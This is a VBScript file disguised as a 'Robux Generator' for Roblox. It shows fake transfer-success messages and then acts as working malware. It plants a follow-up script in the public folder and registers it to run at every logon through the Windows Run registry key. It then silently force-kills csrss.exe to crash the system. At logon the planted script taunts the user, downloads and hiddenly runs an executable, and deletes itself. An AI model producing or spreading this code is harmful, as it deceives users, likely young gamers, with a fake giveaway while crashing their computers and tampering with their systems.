Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

username = InputBox("Enter your Roblox username:", "Robux Generator")
If username = "" Then
    MsgBox "Username cannot be empty!", vbCritical, "Error"
    WScript.Quit
End If

robuxAmount = InputBox("How much Robux do you want?", "Robux Generator")
If robuxAmount = "" Or Not IsNumeric(robuxAmount) Then
    MsgBox "Invalid Robux amount!", vbCritical, "Error"
    WScript.Quit
End If

MsgBox "Connecting to Roblox servers...", vbInformation, "Processing"
WScript.Sleep 2000
MsgBox "Authenticating user """ & username & """...", vbInformation, "Processing"
WScript.Sleep 2000
MsgBox "Transferring " & robuxAmount & " Robux...", vbInformation, "Processing"
WScript.Sleep 3000
MsgBox "✅ Transfer successful! " & robuxAmount & " Robux added to " & username & "'s account!", vbInformation, "Success"

MsgBox "Error: SYSTEM32 folder is locked by administrator. Cannot proceed!", vbCritical, "Access Denied"
WScript.Sleep 2000

postBSODPath = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\postbsod.vbs"
Set postBSODFile = fso.CreateTextFile(postBSODPath, True)
postBSODFile.WriteLine "MsgBox ""You believed that? No, it ended csrss.exe."", vbInformation, ""Gotcha"""
postBSODFile.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
postBSODFile.WriteLine "Set http = CreateObject(""MSXML2.XMLHTTP"")"
postBSODFile.WriteLine "Set stream = CreateObject(""ADODB.Stream"")"
postBSODFile.WriteLine "url = ""https://setup.rbxcdn.com/RobloxPlayerLauncher.exe"""
postBSODFile.WriteLine "filePath = shell.ExpandEnvironmentStrings(""%TEMP%"") & ""\RobloxPlayerLauncher.exe"""
postBSODFile.WriteLine "http.Open ""GET"", url, False"
postBSODFile.WriteLine "http.Send"
postBSODFile.WriteLine "If http.Status = 200 Then"
postBSODFile.WriteLine "  stream.Type = 1"
postBSODFile.WriteLine "  stream.Open"
postBSODFile.WriteLine "  stream.Write http.responseBody"
postBSODFile.WriteLine "  stream.SaveToFile filePath, 2"
postBSODFile.WriteLine "  stream.Close"
postBSODFile.WriteLine "  shell.Run Chr(34) & filePath & Chr(34), 0, False"
postBSODFile.WriteLine "End If"
postBSODFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
postBSODFile.WriteLine "fso.DeleteFile WScript.ScriptFullName"
postBSODFile.Close

regCmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v PostBSOD /t REG_SZ /d ""wscript.exe " & postBSODPath & """ /f"
shell.Run regCmd, 0, True

psKillCmd = "powershell -command ""Stop-Process -Name csrss -Force"""
shell.Run psKillCmd, 0, False
